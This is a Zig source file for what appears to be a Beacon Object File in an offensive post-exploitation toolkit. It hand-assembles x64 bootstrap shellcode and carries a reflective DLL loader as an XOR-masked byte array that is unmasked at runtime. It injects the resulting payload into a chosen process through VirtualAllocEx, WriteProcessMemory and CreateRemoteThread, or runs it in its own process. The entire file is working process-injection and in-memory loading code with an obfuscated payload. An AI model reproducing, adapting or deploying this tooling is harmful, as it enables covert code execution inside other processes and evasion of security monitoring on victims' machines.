const std = @import("std");
const bof_api = @import("bof_api");
const beacon = bof_api.beacon;
const w32 = bof_api.win32;
const bof_launcher = @import("bof_launcher_api");

pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
    var parser = beacon.datap{};
    beacon.dataParse(&parser, arg_data, arg_len);

    const bof_bytes = blk: {
        const bof_len = beacon.dataInt(&parser);

        // BOF address must be passed like this:
        // try bof_args.add(std.mem.asBytes(&bof_ptr));
        const bof_ptr: *const [@sizeOf(usize)]u8 = @ptrCast(beacon.dataExtract(&parser, null));

        break :blk @as([*]const u8, @ptrFromInt(std.mem.readInt(usize, bof_ptr, .little)))[0..@intCast(bof_len)];
    };

    const pid = beacon.dataInt(&parser);

    const dumpbin = blk: {
        if (beacon.dataLength(&parser) != 0) {
            if (beacon.dataExtract(&parser, null)) |ptr| {
                if (std.mem.eql(u8, std.mem.span(ptr), "-dumpbin")) break :blk true;
            }
        }
        break :blk false;
    };

    const shellcode_bytes = genShellcode(bof_bytes) catch return 0xff;
    defer freeShellcode(shellcode_bytes);

    if (dumpbin) {
        // TODO: Implement.
    }

    // PID 0 is Windows idle process
    if (pid == 0) {
        return 0;
    }

    // PID -1 is current process
    if (pid == -1) {
        var old_protection: w32.DWORD = 0;
        if (w32.VirtualProtect(
            @constCast(shellcode_bytes.ptr),
            4096,
            w32.PAGE_EXECUTE_READ,
            &old_protection,
        ) == w32.FALSE) return 0xff;

        if (w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096) == w32.FALSE) return 0xff;

        @as(*const fn () callconv(.C) void, @ptrCast(shellcode_bytes.ptr))();
        return 0;
    }

    const process = w32.OpenProcess(
        w32.PROCESS_VM_WRITE | w32.PROCESS_CREATE_THREAD | w32.PROCESS_VM_OPERATION,
        w32.FALSE,
        @bitCast(pid),
    ) orelse return 0xff;
    defer _ = w32.CloseHandle(process);

    const addr = w32.VirtualAllocEx(
        process,
        null,
        shellcode_bytes.len,
        w32.MEM_COMMIT | w32.MEM_RESERVE,
        w32.PAGE_READWRITE,
    ) orelse return 0xff;
    defer _ = w32.VirtualFreeEx(process, addr, shellcode_bytes.len, w32.MEM_RELEASE);

    {
        var num_bytes: w32.SIZE_T = undefined;
        if (w32.WriteProcessMemory(
            process,
            addr,
            shellcode_bytes.ptr,
            shellcode_bytes.len,
            &num_bytes,
        ) == w32.FALSE) return 0xff;
        if (num_bytes != shellcode_bytes.len) return 0xff;
    }
    {
        var old_protection: w32.DWORD = undefined;
        if (w32.VirtualProtectEx(
            process,
            addr,
            4096,
            w32.PAGE_EXECUTE_READ,
            &old_protection,
        ) == w32.FALSE) return 0xff;

        if (w32.FlushInstructionCache(process, addr, 4096) == w32.FALSE) return 0xff;
    }

    const thread_handle = w32.CreateRemoteThread(process, null, 0, @ptrCast(addr), null, 0, null) orelse return 0xff;
    defer _ = w32.CloseHandle(thread_handle);

    return 0;
}

const RDI_FLAG_CLEARHEADER = 0x1;
const RDI_FLAG_CLEARMEMORY = 0x2;
const RDI_FLAG_OBFUSCATEIMPORTS = 0x4;
const RDI_FLAG_PASS_SHELLCODE_BASE = 0x8;

fn genShellcode(bof_bytes: []const u8) ![]const u8 {
    const bof_launcher_bytes = @embedFile("bof_launcher_lib_embed");

    var rdi_shellcode: [rdi_shellcode64_masked.len]u8 = undefined;
    @memcpy(&rdi_shellcode, &rdi_shellcode64_masked);
    for (0..rdi_shellcode.len) |i| {
        rdi_shellcode[i] ^= 0x55;
    }
    const rdi_shellcode_bytes = rdi_shellcode[0..];

    var bootstrap: [69]u8 = undefined;
    var fbs_bootstrap = std.io.fixedBufferStream(bootstrap[0..]);
    const w = fbs_bootstrap.writer();

    const dll_offset: u32 = @intCast(@sizeOf(@TypeOf(bootstrap)) - 5 + rdi_shellcode_bytes.len);
    const user_data_location: u32 = @intCast(dll_offset + bof_launcher_bytes.len);
    const bof_data_len: u32 = @intCast(bof_bytes.len);
    const rdi_flags: u32 = 0; // No flags

    // RDI shellcode function that bootstrap calls:
    //
    // ULONG_PTR LoadDLL(
    //      PBYTE   pbModule,           // Arg 1
    //      DWORD   dwFunctionHash,     // Arg 2
    //      LPVOID  lpUserData,         // Arg 3
    //      DWORD   dwUserdataLen,      // Arg 4
    //      PVOID   pvShellcodeBase,    // Arg 5
    //      DWORD   dwFlags)            // Arg 6 (RDI_FLAG_*)

    // Pushes next instruction address to stack
    // call 0x5
    try w.writeAll(&.{ 0xe8, 0x00, 0x00, 0x00, 0x00 });

    // pop rcx
    try w.writeByte(0x59);

    // mov r8, rcx
    try w.writeAll(&.{ 0x49, 0x89, 0xc8 });

    // Arg 2 (dwFunctionHash)
    // Hash of "bofRun" string
    // mov edx, <hash of function name>
    try w.writeByte(0xba);
    try w.writeInt(u32, 0x28fe7d78, .little);

    // Arg 3 (lpUserData)
    // add r8, <offset of the dll> + <length of dll>
    try w.writeAll(&.{ 0x49, 0x81, 0xc0 });
    try w.writeInt(u32, user_data_location, .little);

    // Arg 4 (dwUserdataLen)
    // mov r9d, <length of user data>
    try w.writeAll(&.{ 0x41, 0xb9 });
    try w.writeInt(u32, bof_data_len, .little);

    // push rsi
    try w.writeByte(0x56);

    // mov rsi, rsp
    try w.writeAll(&.{ 0x48, 0x89, 0xe6 });

    // Align stack to 16 bytes
    // and rsp, -16
    try w.writeAll(&.{ 0x48, 0x83, 0xe4, 0xf0 });

    // Shadow space (4 * 8) + two args (2 * 8)
    // sub rsp, 6 * 8
    try w.writeAll(&.{ 0x48, 0x83, 0xec, 6 * 8 });

    // Arg 5 (pvShellcodeBase)
    // mov qword ptr [rsp + 4 * 8], rcx
    try w.writeAll(&.{ 0x48, 0x89, 0x4c, 0x24, 4 * 8 });

    // Arg 1 (pbModule)
    // add rcx, <offset of the dll>
    try w.writeAll(&.{ 0x48, 0x81, 0xc1 });
    try w.writeInt(u32, dll_offset, .little);

    // Arg 6 (dwFlags)
    // mov dword ptr [rsp + 5 * 8], <rdi flags>
    try w.writeAll(&.{ 0xc7, 0x44, 0x24, 5 * 8 });
    try w.writeInt(u32, rdi_flags, .little);

    // Transfer execution to the RDI
    // call LoadDLL
    try w.writeByte(0xe8);
    try w.writeAll(&.{ @intCast(@sizeOf(@TypeOf(bootstrap)) - try fbs_bootstrap.getPos() - 4), 0x00, 0x00, 0x00 });

    // mov rsp, rsi
    try w.writeAll(&.{ 0x48, 0x89, 0xf4 });

    // pop rsi
    try w.writeByte(0x5e);

    // ret
    try w.writeByte(0xc3);

    const shellcode_bytes = std.mem.concat(
        std.heap.page_allocator,
        u8,
        &[_][]const u8{ fbs_bootstrap.getWritten(), rdi_shellcode_bytes, bof_launcher_bytes, bof_bytes },
    ) catch @panic("OOM");

    return shellcode_bytes;
}

fn freeShellcode(shellcode_bytes: []const u8) void {
    std.heap.page_allocator.free(shellcode_bytes);
}

const rdi_shellcode64_masked = [2772]u8{
    29,  222, 145, 29,  220, 13,  93,  17,  220, 29,  117, 25,  220, 21,  77,  220,
    5,   69,  0,   3,   2,   20,  1,   20,  0,   20,  3,   20,  2,   29,  216, 57,
    113, 197, 29,  212, 185, 37,  84,  85,  85,  16,  102, 170, 146, 16,  133, 62,
    85,  48,  85,  29,  222, 164, 25,  220, 40,  173, 236, 70,  201, 234, 232, 25,
    220, 40,  157, 17,  222, 191, 25,  220, 40,  93,  16,  216, 26,  48,  25,  220,
    40,  69,  17,  221, 24,  233, 17,  221, 24,  247, 25,  220, 40,  85,  25,  220,
    40,  189, 25,  220, 40,  77,  17,  220, 40,  113, 17,  220, 41,  113, 113, 146,
    16,  129, 39,  85,  59,  85,  146, 16,  141, 48,  85,  57,  85,  146, 16,  137,
    102, 85,  103, 85,  146, 16,  181, 123, 85,  49,  85,  146, 16,  177, 57,  85,
    57,  85,  146, 17,  113, 21,  6,   57,  48,  48,  147, 17,  113, 17,  37,  146,
    17,  113, 13,  25,  58,  52,  49,  146, 17,  113, 9,   25,  60,  55,  39,  146,
    17,  113, 53,  52,  39,  44,  20,  146, 17,  113, 29,  3,   60,  39,  33,  146,
    17,  113, 25,  32,  52,  57,  20,  146, 17,  113, 5,   57,  57,  58,  54,  146,
    17,  113, 61,  3,   60,  39,  33,  146, 17,  113, 57,  32,  52,  57,  5,   146,
    17,  113, 37,  39,  58,  33,  48,  51,  146, 17,  113, 33,  54,  33,  146, 16,
    253, 19,  57,  32,  38,  146, 16,  249, 61,  28,  59,  38,  146, 16,  229, 33,
    39,  32,  54,  146, 16,  225, 33,  60,  58,  59,  146, 16,  237, 22,  52,  54,
    61,  146, 17,  113, 45,  18,  48,  33,  27,  146, 17,  113, 41,  52,  33,  60,
    35,  146, 16,  213, 48,  6,   44,  38,  146, 16,  209, 33,  48,  56,  28,  51,
    146, 16,  221, 59,  51,  147, 16,  223, 58,  146, 16,  197, 7,   33,  57,  20,
    146, 16,  193, 49,  49,  19,  32,  146, 16,  205, 59,  54,  33,  60,  146, 16,
    201, 58,  59,  1,   52,  51,  146, 16,  245, 55,  57,  189, 49,  93,  85,  85,
    236, 224, 20,  140, 11,  29,  222, 141, 189, 2,   93,  85,  85,  25,  222, 181,
    29,  220, 16,  165, 29,  216, 16,  133, 146, 16,  117, 77,  85,  77,  85,  25,
    216, 25,  113, 109, 29,  220, 16,  125, 25,  216, 16,  117, 102, 135, 102, 156,
    170, 134, 29,  222, 25,  113, 109, 29,  216, 17,  113, 29,  16,  102, 149, 29,
    220, 17,  113, 125, 25,  216, 24,  157, 146, 17,  113, 117, 89,  85,  89,  85,
    29,  216, 1,   113, 117, 20,  170, 129, 29,  222, 25,  113, 109, 29,  216, 17,
    113, 61,  16,  102, 149, 29,  220, 17,  113, 125, 25,  216, 24,  85,  146, 17,
    113, 117, 91,  85,  91,  85,  29,  216, 1,   113, 117, 20,  170, 129, 146, 17,
    113, 117, 64,  85,  64,  85,  29,  222, 25,  113, 109, 29,  216, 16,  253, 16,
    102, 149, 29,  220, 17,  113, 125, 25,  216, 24,  93,  29,  216, 1,   113, 117,
    20,  170, 129, 29,  222, 25,  113, 109, 29,  216, 17,  113, 45,  16,  102, 149,
    29,  220, 17,  113, 125, 25,  216, 24,  69,  146, 17,  113, 117, 70,  85,  70,
    85,  29,  216, 1,   113, 117, 20,  170, 129, 29,  222, 25,  113, 109, 29,  216,
    17,  113, 21,  16,  102, 149, 29,  220, 17,  113, 125, 25,  216, 24,  189, 146,
    17,  113, 117, 80,  85,  80,  85,  29,  216, 1,   113, 117, 20,  170, 129, 29,
    222, 25,  113, 109, 29,  216, 16,  197, 16,  102, 149, 29,  220, 17,  113, 125,
    25,  216, 24,  77,  146, 17,  113, 117, 70,  85,  70,  85,  29,  216, 1,   113,
    117, 20,  170, 129, 29,  222, 25,  113, 109, 29,  216, 17,  113, 13,  16,  102,
    149, 29,  220, 17,  113, 125, 25,  216, 24,  173, 146, 17,  113, 117, 89,  85,
    89,  85,  29,  216, 1,   113, 117, 20,  170, 129, 25,  108, 40,  157, 90,  209,
    86,  82,  85,  85,  25,  108, 40,  85,  90,  209, 172, 83,  85,  85,  25,  108,
    40,  189, 90,  209, 186, 83,  85,  85,  25,  108, 40,  93,  90,  209, 176, 83,
    85,  85,  25,  222, 24,  69,  24,  208, 156, 90,  209, 141, 83,  85,  85,  29,
    54,  43,  105, 29,  86,  171, 212, 106, 5,   16,  85,  85,  90,  208, 144, 83,
    85,  85,  237, 49,  211, 85,  85,  51,  108, 18,  81,  90,  208, 227, 83,  85,
    85,  17,  222, 18,  109, 16,  216, 10,  84,  16,  209, 150, 90,  208, 240, 83,
    85,  85,  90,  226, 26,  65,  20,  222, 138, 29,  214, 148, 113, 51,  17,  110,
    42,  83,  38,  124, 17,  90,  226, 2,   83,  29,  86,  154, 222, 20,  81,  222,
    68,  208, 149, 32,  83,  20,  216, 81,  69,  190, 87,  86,  151, 110, 150, 90,
    19,  150, 29,  214, 148, 125, 222, 141, 24,  126, 134, 32,  138, 29,  216, 24,
    109, 20,  170, 132, 222, 0,   105, 17,  222, 151, 17,  216, 39,  170, 162, 143,
    17,  86,  34,  5,   28,  216, 29,  170, 222, 151, 25,  118, 165, 222, 150, 29,
    86,  157, 28,  216, 21,  170, 29,  162, 133, 29,  118, 157, 25,  110, 164, 90,
    208, 103, 83,  85,  85,  29,  222, 26,  101, 20,  236, 81,  85,  85,  85,  20,
    237, 85,  101, 85,  85,  28,  222, 131, 170, 0,   157, 29,  222, 141, 29,  208,
    149, 32,  64,  17,  216, 29,  81,  20,  237, 85,  101, 85,  85,  28,  222, 131,
    102, 156, 170, 0,   157, 29,  222, 141, 20,  238, 84,  85,  85,  85,  17,  209,
    200, 141, 85,  85,  85,  33,  72,  222, 19,  105, 220, 22,  105, 222, 3,   105,
    190, 94,  222, 159, 20,  86,  134, 223, 81,  100, 221, 81,  76,  110, 2,   1,
    39,  165, 190, 76,  20,  222, 130, 17,  108, 42,  1,   35,  69,  222, 159, 20,
    86,  134, 223, 81,  100, 221, 81,  76,  110, 2,   1,   39,  165, 29,  54,  46,
    105, 16,  222, 130, 29,  86,  174, 29,  220, 40,  101, 17,  90,  226, 18,  65,
    28,  214, 149, 125, 51,  17,  110, 42,  83,  38,  111, 25,  86,  146, 16,  222,
    154, 16,  108, 109, 35,  74,  20,  222, 5,   81,  20,  222, 29,  169, 20,  222,
    148, 16,  86,  158, 29,  86,  157, 29,  86,  133, 223, 81,  103, 221, 81,  76,
    16,  110, 93,  39,  180, 90,  226, 18,  83,  16,  86,  134, 28,  214, 149, 125,
    17,  110, 133, 39,  156, 25,  222, 166, 20,  237, 87,  85,  85,  85,  25,  126,
    34,  101, 90,  209, 131, 85,  85,  85,  17,  108, 234, 225, 85,  85,  85,  90,
    209, 156, 85,  85,  85,  17,  222, 218, 229, 85,  85,  85,  25,  86,  158, 16,
    108, 108, 90,  209, 227, 85,  85,  85,  24,  216, 4,   93,  188, 196, 85,  85,
    85,  16,  90,  226, 79,  20,  90,  226, 158, 20,  90,  226, 150, 51,  148, 188,
    89,  51,  214, 172, 95,  32,  124, 16,  222, 84,  20,  212, 182, 170, 90,  85,
    85,  30,  216, 81,  77,  29,  222, 65,  77,  30,  216, 81,  77,  20,  238, 84,
    85,  85,  85,  28,  86,  131, 29,  220, 65,  77,  16,  216, 22,  84,  190, 26,
    20,  238, 84,  85,  85,  85,  51,  214, 172, 86,  32,  91,  112, 170, 90,  85,
    85,  29,  216, 89,  86,  20,  222, 147, 190, 123, 51,  20,  110, 158, 32,  64,
    112, 170, 90,  85,  85,  29,  216, 89,  86,  28,  222, 147, 29,  148, 189, 69,
    90,  226, 149, 190, 70,  51,  20,  110, 157, 32,  65,  112, 170, 90,  85,  85,
    29,  216, 89,  86,  20,  90,  226, 147, 20,  222, 68,  29,  84,  81,  95,  24,
    86,  133, 20,  222, 20,  81,  28,  86,  148, 25,  110, 133, 90,  208, 10,  170,
    170, 170, 24,  222, 159, 16,  108, 111, 90,  208, 31,  170, 170, 170, 17,  108,
    234, 193, 85,  85,  85,  90,  209, 206, 84,  85,  85,  222, 218, 197, 85,  85,
    85,  16,  222, 186, 25,  216, 81,  76,  28,  216, 21,  89,  190, 82,  16,  86,
    190, 29,  216, 21,  65,  17,  108, 109, 32,  161, 222, 208, 141, 85,  85,  85,
    16,  222, 178, 214, 181, 81,  220, 16,  149, 222, 148, 90,  209, 219, 85,  85,
    85,  16,  110, 190, 90,  211, 208, 85,  85,  85,  17,  222, 240, 141, 85,  85,
    85,  16,  216, 8,   170, 20,  148, 185, 69,  16,  222, 130, 16,  208, 142, 33,
    59,  24,  222, 157, 20,  235, 170, 42,  85,  85,  20,  90,  69,  84,  102, 135,
    20,  222, 152, 20,  126, 159, 60,  163, 168, 22,  86,  85,  20,  222, 147, 162,
    164, 102, 135, 212, 147, 150, 203, 115, 85,  216, 29,  84,  222, 147, 148, 189,
    69,  20,  118, 147, 162, 164, 20,  86,  151, 20,  170, 151, 29,  216, 89,  213,
    20,  222, 1,   221, 69,  20,  90,  69,  89,  221, 20,  90,  68,  81,  221, 20,
    222, 20,  69,  20,  220, 17,  221, 69,  20,  90,  68,  92,  20,  220, 4,   69,
    24,  216, 28,  65,  16,  110, 134, 39,  244, 222, 210, 197, 85,  85,  85,  222,
    165, 29,  86,  166, 222, 19,  89,  208, 149, 90,  209, 233, 85,  85,  85,  222,
    40,  149, 222, 157, 29,  86,  158, 170, 0,   173, 29,  220, 17,  113, 109, 25,
    222, 133, 17,  222, 99,  17,  222, 43,  69,  25,  86,  166, 25,  86,  174, 28,
    222, 91,  29,  208, 156, 33,  48,  29,  222, 40,  165, 29,  208, 156, 44,  93,
    16,  90,  226, 83,  102, 135, 190, 103, 29,  216, 6,   87,  102, 149, 29,  86,
    132, 109, 87,  33,  91,  29,  222, 159, 29,  170, 148, 29,  170, 149, 213, 108,
    85,  32,  160, 29,  220, 1,   113, 125, 16,  102, 149, 29,  216, 1,   113, 117,
    51,  220, 17,  113, 117, 51,  220, 17,  113, 119, 24,  222, 154, 28,  222, 159,
    170, 130, 28,  214, 147, 93,  28,  214, 146, 93,  28,  222, 91,  29,  208, 156,
    33,  82,  25,  222, 1,   113, 109, 190, 247, 222, 40,  149, 16,  102, 170, 16,
    208, 177, 33,  65,  208, 170, 33,  69,  20,  214, 168, 84,  35,  95,  20,  60,
    153, 189, 86,  85,  85,  170, 0,   189, 222, 19,  117, 29,  214, 147, 65,  208,
    149, 90,  208, 30,  170, 170, 170, 29,  222, 40,  101, 17,  222, 248, 237, 85,
    85,  85,  25,  222, 48,  165, 17,  108, 234, 161, 85,  85,  85,  90,  209, 236,
    85,  85,  85,  17,  222, 234, 165, 85,  85,  85,  28,  214, 146, 81,  25,  86,
    174, 20,  222, 82,  208, 149, 90,  209, 200, 85,  85,  85,  20,  232, 117, 85,
    85,  85,  222, 157, 29,  86,  158, 170, 0,   173, 29,  220, 17,  113, 109, 29,
    222, 157, 20,  222, 34,  93,  16,  222, 34,  89,  29,  86,  166, 25,  86,  166,
    29,  214, 107, 85,  33,  11,  28,  222, 67,  29,  208, 135, 44,  93,  17,  90,
    226, 151, 102, 135, 190, 102, 25,  216, 22,  87,  102, 149, 25,  86,  151, 20,
    109, 85,  33,  91,  28,  222, 133, 29,  170, 151, 29,  170, 149, 213, 111, 85,
    32,  160, 25,  220, 17,  113, 125, 29,  216, 1,   113, 117, 16,  102, 149, 51,
    220, 17,  113, 117, 51,  220, 17,  113, 119, 25,  222, 155, 20,  170, 129, 29,
    214, 147, 93,  28,  214, 147, 93,  29,  214, 107, 85,  33,  82,  29,  222, 25,
    113, 109, 190, 247, 24,  86,  168, 20,  222, 82,  208, 149, 90,  208, 37,  170,
    170, 170, 17,  222, 248, 237, 85,  85,  85,  16,  102, 170, 90,  226, 34,  65,
    16,  222, 162, 29,  214, 147, 125, 20,  233, 84,  85,  85,  85,  51,  17,  110,
    42,  83,  90,  214, 241, 85,  85,  85,  29,  86,  162, 16,  216, 57,  113, 74,
    17,  108, 107, 33,  41,  222, 19,  65,  222, 157, 212, 180, 85,  85,  85,  21,
    90,  239, 181, 72,  39,  119, 208, 156, 32,  89,  208, 149, 17,  216, 20,  93,
    16,  90,  28,  145, 190, 102, 20,  237, 81,  85,  85,  85,  208, 149, 20,  216,
    21,  171, 17,  90,  28,  149, 190, 116, 208, 156, 32,  68,  236, 69,  85,  85,
    85,  208, 149, 17,  216, 20,  37,  17,  90,  28,  148, 190, 89,  208, 149, 20,
    237, 21,  85,  85,  85,  16,  90,  28,  144, 17,  220, 17,  113, 101, 162, 19,
    65,  85,  85,  85,  81,  33,  95,  20,  90,  239, 189, 92,  17,  220, 17,  113,
    101, 222, 27,  169, 25,  216, 25,  113, 101, 222, 67,  29,  86,  158, 170, 0,
    85,  90,  226, 18,  83,  16,  86,  161, 29,  214, 147, 125, 17,  110, 165, 90,
    215, 62,  170, 170, 170, 17,  222, 248, 237, 85,  85,  85,  16,  102, 149, 102,
    135, 29,  214, 156, 170, 170, 0,   93,  17,  108, 234, 129, 85,  85,  85,  33,
    113, 222, 210, 133, 85,  85,  85,  29,  222, 33,  77,  77,  190, 90,  16,  102,
    149, 20,  222, 129, 29,  222, 158, 170, 133, 29,  216, 35,  93,  29,  222, 83,
    29,  208, 149, 32,  188, 25,  222, 24,  77,  24,  208, 156, 33,  122, 222, 210,
    241, 85,  85,  85,  208, 149, 33,  112, 222, 157, 25,  222, 150, 29,  237, 254,
    255, 255, 255, 255, 255, 255, 255, 29,  162, 180, 222, 218, 245, 85,  85,  85,
    29,  148, 191, 86,  29,  86,  158, 20,  126, 129, 20,  170, 132, 222, 18,  125,
    24,  222, 145, 29,  86,  150, 20,  222, 129, 29,  222, 158, 170, 133, 16,  208,
    184, 90,  209, 238, 85,  85,  85,  17,  108, 234, 217, 85,  85,  85,  90,  209,
    251, 85,  85,  85,  222, 218, 221, 85,  85,  85,  29,  86,  158, 17,  222, 12,
    77,  16,  208, 142, 90,  209, 205, 85,  85,  85,  17,  108, 44,  65,  90,  209,
    219, 85,  85,  85,  17,  222, 28,  117, 20,  222, 170, 222, 4,   113, 25,  86,
    158, 29,  86,  134, 16,  208, 142, 33,  44,  16,  222, 84,  16,  222, 130, 25,
    86,  150, 33,  59,  20,  223, 85,  209, 149, 33,  75,  24,  86,  145, 90,  235,
    149, 17,  86,  133, 20,  148, 159, 88,  20,  223, 85,  209, 149, 32,  185, 16,
    110, 191, 32,  80,  29,  208, 135, 32,  71,  20,  86,  169, 28,  214, 148, 81,
    29,  214, 151, 87,  20,  110, 174, 38,  108, 190, 235, 222, 20,  73,  90,  226,
    95,  29,  86,  150, 17,  222, 81,  221, 25,  86,  150, 163, 208, 141, 85,  85,
    85,  93,  33,  91,  29,  222, 216, 133, 85,  85,  85,  239, 93,  85,  85,  85,
    190, 88,  222, 192, 157, 85,  85,  85,  29,  222, 216, 149, 85,  85,  85,  20,
    170, 133, 29,  222, 150, 190, 87,  102, 149, 29,  222, 201, 113, 229, 84,  85,
    85,  29,  212, 145, 37,  84,  85,  85,  20,  10,  20,  11,  20,  8,   20,  9,
    10,  11,  8,   150, 29,  222, 145, 29,  220, 13,  93,  29,  220, 61,  69,  29,
    220, 37,  77,  29,  220, 45,  117, 20,  3,   29,  214, 185, 69,  48,  29,  222,
    81,  112, 53,  85,  85,  85,  222, 188, 16,  102, 163, 29,  222, 5,   77,  25,
    222, 7,   69,  24,  222, 23,  101, 24,  208, 149, 90,  209, 226, 85,  85,  85,
    20,  90,  69,  23,  13,  28,  54,  21,  105, 20,  222, 131, 24,  222, 71,  166,
    90,  42,  81,  113, 19,  222, 201, 85,  221, 85,  85,  85,  16,  208, 142, 33,
    135, 29,  222, 81,  113, 29,  148, 189, 69,  51,  17,  110, 165, 38,  119, 29,
    222, 25,  113, 93,  17,  90,  226, 157, 90,  235, 84,  148, 159, 88,  213, 108,
    52,  41,  86,  214, 151, 181, 86,  133, 29,  170, 148, 28,  214, 188, 84,  32,
    178, 30,  216, 105, 77,  17,  222, 26,  77,  222, 18,  117, 20,  170, 156, 28,
    86,  149, 31,  216, 97,  221, 190, 125, 222, 75,  16,  222, 139, 28,  86,  141,
    29,  216, 35,  169, 90,  235, 94,  29,  170, 150, 20,  148, 158, 88,  17,  86,
    140, 209, 156, 32,  186, 20,  216, 81,  70,  110, 144, 33,  91,  20,  170, 156,
    20,  214, 172, 84,  34,  135, 188, 13,  170, 170, 170, 222, 18,  113, 22,  216,
    89,  92,  28,  86,  149, 90,  226, 65,  84,  222, 26,  73,  28,  86,  157, 222,
    81,  196, 28,  86,  149, 190, 87,  102, 149, 29,  222, 9,   113, 117, 29,  222,
    57,  113, 125, 29,  222, 33,  113, 101, 29,  222, 41,  113, 109, 29,  214, 145,
    69,  20,  11,  150,
};
